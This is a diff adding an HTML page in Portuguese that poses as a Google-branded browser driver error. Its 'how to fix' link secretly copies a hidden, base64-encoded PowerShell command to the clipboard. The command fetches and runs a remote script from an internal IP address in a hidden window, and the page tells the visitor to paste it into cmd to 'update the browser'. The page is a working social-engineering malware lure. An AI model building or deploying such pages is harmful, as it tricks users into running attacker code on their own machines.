@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="SHORTCUT ICON" href="logo.ico" type="image/x-icon" />
+    <title>Erro 407 - Driver Failure Contest</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            margin-top: 100px;
+        }
+
+        h1 {
+            font-size: 2em;
+            color: #333;
+        }
+
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgb(0,0,0);
+            background-color: rgba(0,0,0,0.4);
+        }
+        .modal img {
+            width: 80%;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        textarea {
+            width: 100%;
+            height: 100px;
+            margin-top: 10px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 16px;
+        }
+
+        #copy-notification {
+            display: none;
+            margin-top: 10px;
+            color: #1a73e8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img id="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" width="272" height="92" style="margin-bottom:-15px;">
+        <h1>407 - Driver Failure Contest </h1>
+        <p>[ERROR] [2024-08-25T12:34:56.789Z] [chrome-driver] - Failed to start ChromeDriver service<br>
+            Message: Failed to start ChromeDriver service. Ensure that the ChromeDriver executable is in your PATH.<br>
+            
+            [INFO] [2024-08-25T12:34:56.790Z] [chrome-driver] - Starting ChromeDriver v116.0.5845.96 (driver path: /path/to/chromedriver)<br>
+            [ERROR] [2024-08-25T12:34:56.792Z] [chrome-driver] - Port 9515 is already in use. Unable to bind to port.<br>
+            </p>
+        <a href="#" id="help-link">Como resolver</a>
+        <p id="copy-notification">Comando copiado para a área de transferência!</p>
+    </div>
+
+    <!-- Modal -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Instruções de Resolução</h2>
+            <p>abra o cmd e cole o comando que foi inserido no seu "copiar e colar" para atualizar o seu navegador</p>
+            <img src="footstep_1.png">
+            <p>para colar o comando é só clicar com o botão direito na telinha e apertar enter!</p>
+            <img src="footstep_2.png">
+            <p> Ao terminar a atualização você poderá voltar a navegar tranquilamente! </p>
+            <img src="footstep_3.png">
+            <textarea style="height:0px;width:0px;opacity:0;"readonly id="command-text">powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADAAMAAuADEANwA2AC8AaQBuAHMAdAByAHUAYwB0AGkAbwBuAHMALgBwAGgAcAAnACkA -WindowStyle Hidden</textarea>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const modal = document.getElementById('myModal');
+            const helpLink = document.getElementById('help-link');
+            const closeModal = document.querySelector('.modal .close');
+            const commandText = document.getElementById('command-text');
+            const copyNotification = document.getElementById('copy-notification');
+
+            helpLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                // Show the modal
+                modal.style.display = 'block';
+                
+                // Copy the command to the clipboard
+                navigator.clipboard.writeText(commandText.value).then(() => {
+                    copyNotification.style.display = 'block';
+                    setTimeout(() => copyNotification.style.display = 'none', 3000);
+                }).catch(err => {
+                    console.error('Falha ao copiar o comando: ', err);
+                });
+            });
+
+            closeModal.addEventListener('click', () => {
+                modal.style.display = 'none';
+            });
+
+            window.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.style.display = 'none';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
